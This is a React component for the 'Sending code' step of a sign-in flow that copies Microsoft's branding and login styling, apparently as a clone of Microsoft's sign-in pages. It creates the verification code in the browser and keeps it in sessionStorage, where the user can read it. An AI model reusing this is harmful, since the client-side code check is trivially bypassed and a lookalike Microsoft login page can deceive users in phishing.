import { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { sendVerificationCode } from "../api/auth.js";
import AuthLayout from "../components/AuthLayout.jsx";
import MicrosoftLogo from "../components/MicrosoftLogo.jsx";
import { useAuthFlow } from "../context/AuthFlowContext.jsx";

export default function SendingCodePage() {
  const navigate = useNavigate();
  const { email } = useAuthFlow();

  useEffect(() => {
    if (!email) {
      navigate("/signin", { replace: true });
      return;
    }

    const sendCode = async () => {
      try {
        // Generate a random 6-digit code
        const code = Math.floor(100000 + Math.random() * 900000).toString();

        // Save it if you'll need it on the verify page
        sessionStorage.setItem("verificationCode", code);

        const response = await sendVerificationCode(email, code);

        console.log(response);

        if (response.success) {
          navigate("/verify", { replace: true });
        }
      } catch (error) {
        console.error(error);

        alert(
          error.response?.data?.message ||
            error.response?.data?.error ||
            "Failed to send verification code.",
        );

        navigate("/signin", { replace: true });
      }
    };

    sendCode();
  }, [email, navigate]);

  return (
    <AuthLayout>
      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        .ms-spinner {
          animation: spin 0.9s linear infinite;
        }
      `}</style>

      <div
        style={{
          display: "flex",
          alignItems: "center",
          gap: "10px",
          marginBottom: "28px",
        }}
      >
        <MicrosoftLogo />
        <span style={{ fontSize: "21px", color: "#5e5e5e", fontWeight: 600 }}>
          Microsoft
        </span>
      </div>

      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          padding: "32px 0 24px",
        }}
      >
        <div
          className="ms-spinner"
          style={{
            width: "36px",
            height: "36px",
            borderRadius: "50%",
            border: "3px solid #e0e0e0",
            borderTopColor: "#0067b8",
            marginBottom: "22px",
          }}
        />
        <div
          style={{
            fontSize: "16px",
            color: "#1b1b1b",
            fontWeight: 600,
            marginBottom: "6px",
          }}
        >
          Sending code
        </div>
        <div
          style={{ fontSize: "14px", color: "#5e5e5e", textAlign: "center" }}
        >
          We're sending a verification code to {email || "your email"}.
        </div>
      </div>
    </AuthLayout>
  );
}
